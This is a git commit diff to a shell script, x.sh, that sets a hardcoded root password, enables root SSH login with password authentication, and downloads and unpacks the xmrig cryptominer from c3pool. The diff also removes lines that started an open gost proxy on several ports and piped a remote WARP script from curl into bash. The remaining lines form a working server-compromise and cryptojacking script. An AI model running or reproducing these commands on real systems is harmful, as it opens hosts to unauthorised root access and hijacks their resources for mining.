86942377eb64a09fc93e9b2358ca99b55cb57e5e
lamboeio <lamonicagideon@gmail.com>
2024-10-29 04:45:24 +0000

    Update x.sh

--- x.sh
+++ x.sh
@@ -3,9 +3,6 @@ echo root:NP1215GP55*3*com | sudo chpasswd root
 sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 sudo service sshd restart
-apt install -y wget screen
-wget -qO- https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz |gzip -d >./gost && chmod 777 ./gost && screen -Sdm gost ./gost -L=http://:19991 -L=https://:19992 -L=socks5://:19993
-bash <(curl -fsSL git.io/warp.sh) d
 sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
 tar -xf /root/xmrig.tar.gz -C /root
 chmod u+x ./xmrig
